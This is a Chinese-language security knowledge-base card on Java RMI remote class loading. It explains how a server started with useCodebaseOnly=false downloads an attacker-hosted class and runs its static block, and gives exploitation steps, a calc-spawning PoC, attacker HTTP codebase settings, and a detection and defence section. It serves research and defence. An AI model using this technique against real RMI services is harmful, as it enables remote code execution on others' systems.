---
id: web-java-rmi-codebase-remote-class-loading
title: RMI codebase 动态类加载：客户端序列化流携带 java.rmi.server.codebase，服务端 useCodebaseOnly=false 时加载攻击者类并执行静态块
type: scenario
domain: web
path: web/java/rmi
technique: rmi-codebase-remote-class-loading
aliases:
- RMI codebase
- java.rmi.server.codebase
- useCodebaseOnly
- RMI 动态类加载
- RMI 远程类加载
- RMIClassLoader
- codebase 打服务端
tags:
- java
- rmi
- codebase
- classloader
- remote-class-loading
- usecodebaseonly
- rce
cve: []
severity: high
confidence: medium
affected_versions: JDK 6u45/7u21 之前默认 useCodebaseOnly=false；之后默认 true（原文明确），需显式 -Djava.rmi.server.useCodebaseOnly=false 且安装 SecurityManager；原文演示环境 JDK 1.8.0_65（IDE 控制台截图可见），codebase 小节无命令执行成功截图
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V582
  verified_at: '2026-11-12T12:47:00+08:00'
  notes: 已对照原文（1605 行）与全部 36 张截图核对。JDK 版本表述：原文正文明确写'在JDK 6u45、7u21之后，java.rmi.server.useCodebaseOnly默认为true，所以此时就无法满足自动加载远程类文件'，并列出两条件（RMISecurityManager+policy、useCodebaseOnly=false）；截图03/05 显示服务端与客户端 VM options 均含 -Djava.rmi.server.useCodebaseOnly=false、-Djava.security.policy、客户端 -Djava.rmi.server.codebase=http://192.168.2.117:8000/；图04 控制台显示 jdk1.8.0_65 与 setup SecurityManager。原文该小节仅给出代码与 VM 参数，未提供命令执行成功截图（故 confidence medium 合理）。原 affected_versions '原文在 JDK 1.8.0_65 上…复现' 的'复现'表述过强，已用 set-versions 修正为'之前默认 false；之后默认 true（原文明确），需显式设 false；演示环境 JDK 1.8.0_65（截图可见），无成功截图'。卡中原理（序列化流 annotation→RMIClassLoader→静态块）、触发条件、PoC 与原文代码一致；PoC 未在本机复跑；无 sources/source_url。dedup 推荐 new，最相近的 jndi-low-version-rmi-ldap-remote-codebase 为 JNDI Reference factoryClassLocation 触发、受害者执行 lookup，与本卡 RMI 传输层 annotation 方向/触发方不同，非同链。
---

## 一句话结论

RMI 序列化流会把类描述符连同 `java.rmi.server.codebase` 注解一起发给对端；当服务端本地 classpath 没有该类、且 JVM 以 `-Djava.rmi.server.useCodebaseOnly=false` 运行（并安装 SecurityManager 与宽松 policy）时，服务端会按注解从攻击者 HTTP 服务器下载并加载该类的字节码，类初始化（静态块）在类型检查之前执行，从而在服务端实现任意命令执行。

## 原理

- RMI 的动态类加载（Dynamic Class Loading）设计用于让客户端/服务端共享自定义类：发送方在序列化时把 `java.rmi.server.codebase` 属性写入类描述符的 annotation；接收方用 `RMIClassLoader` 按 annotation 的 URL 下载缺失的类。
- 默认行为受 `java.rmi.server.useCodebaseOnly` 控制：为 `true` 时只使用本地 codebase（不信任对端注解）；JDK 6u45/7u21 之后默认值改为 `true`，早期版本默认 `false`。
- 加载远程类还需要 `SecurityManager` 与允许的 `java.security.policy`（否则 RMI 类加载会抛权限错误）；这也是该手法在新环境中越来越少见的另一原因。
- 恶意类一旦被 `Class.forName(name, true, loader)` 方式加载/初始化，静态初始化块 `static { Runtime.getRuntime().exec(...) }` 立即执行；即使随后因类型不匹配抛 `ClassCastException`，命令也已执行。
- 原文的构造：客户端与被调用的 `Payload` 类都在攻击者控制下，`Payload` 继承 `ArrayList`（可序列化、可作为 `sum(List<Integer>)` 参数）；客户端设置 codebase 指向 `http://attacker:8000/`，把编译产物放在该目录；服务端缺类时从 codebase 拉取 `RMIClient$Payload`/外部类，触发其静态初始化。

## 触发条件

- 目标 RMI 服务端 JVM 运行参数包含 `-Djava.rmi.server.useCodebaseOnly=false`（或 JDK 为 6u45/7u21 之前默认 false）。
- 服务端安装了 `SecurityManager` 且 policy 允许 RMI 类加载（原文 `grant { permission java.security.AllPermission; };`）。
- 攻击者能在序列化流中携带 codebase，且服务端可访问该 HTTP(S) 地址。
- 发送的类在服务端 classpath 中不存在（否则优先本地加载，不会远程拉取）。
- 攻击者能 look up 到远程对象并调用一个能传递该对象的方法。

## 利用步骤

1. 服务端启动 RMI 服务并配置：`-Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=java.policy -Djava.rmi.server.hostname=<server-ip>`，`System.setSecurityManager(new SecurityManager())`；绑定远程对象（如 `ICalc.sum(List<Integer>)`）。
2. 攻击者编写远程接口与恶意类（可序列化的 `Payload extends ArrayList`，或任意会被反序列化的类），把命令写入静态初始化块；本机安装同签名接口。
3. 编译后把 `*.class` 放到攻击者 HTTP 根目录：`python -m http.server 8000`。
4. 客户端以 `-Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://attacker:8000/` 启动，lookup 远程对象并调用方法，传入恶意对象。
5. 服务端反序列化时发现本地无此类 → 从 codebase 下载并初始化 → 静态块执行命令；后续即使类型转换失败也不影响。

## PoC

```java
// 攻击者侧：恶意类（静态块在类初始化时执行）
public class RMIClient implements Serializable {
    static {
        try { Runtime.getRuntime().exec("calc"); }
        catch (Exception e) { e.printStackTrace(); }
    }
    public class Payload extends ArrayList<Integer> {}
}
```

```bash
# 攻击者 HTTP 服务发布编译产物
javac *.java
python -m http.server 8000
# 客户端 VM 参数
-Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://ATTACKER:8000/
# 服务端 VM 参数（复现环境）
-Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=java.policy -Djava.rmi.server.hostname=SERVER
```

```java
// 服务端侧只需安装 SecurityManager 并绑定远程对象
System.setSecurityManager(new SecurityManager());
Calc h = new Calc(); LocateRegistry.createRegistry(1099);
Naming.rebind("refObj", h);
```

## 变体与关联

- 变体：JNDI 的 `Reference`/`factoryClassLocation` 也会触发远程 codebase 类加载（见 [[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]），与本卡的 RMI 传输层 codebase 是两条不同入口。
- 变体：反方向（服务端返回带 codebase 的对象打客户端）同理，取决于哪一侧信任对端 annotation。
- 关联：[[web-java-rmi-jrmp-listener-fake-registry-scanner-counterattack]]（同版本窗口内的 RMI 反序列化/动态类加载风险综述）、[[web-java-rmi-remote-method-object-param-deserialization]]（同接口参数面的反序列化入口）。
- 边界：`useCodebaseOnly=true`（JDK 6u45/7u21+ 默认）、未安装 SecurityManager、目标无法访问攻击者 HTTP、类已在服务端本地 classpath、JDK 移除 SecurityManager（17+ 默认禁止）时失效。

## 检测与防御

- 检测：RMI 服务端进程发起异常 HTTP 请求下载 `.class`；`RMIClassLoader` 加载非本地路径类；`SecurityManager` 权限告警；服务端出现 `ClassCastException`/`ClassNotFoundException` 伴随命令进程创建。
- 防御：保持 `java.rmi.server.useCodebaseOnly=true`（不要显式关闭）；升级 JDK（17+ 已移除 SecurityManager，动态类加载基本不可用）；不要把 RMI 端口暴露到不可信网络；用 `jdk.serialFilter` 白名单与 JEP290 过滤；限制服务端出网；移除 `java.security.AllPermission` 宽松 policy。
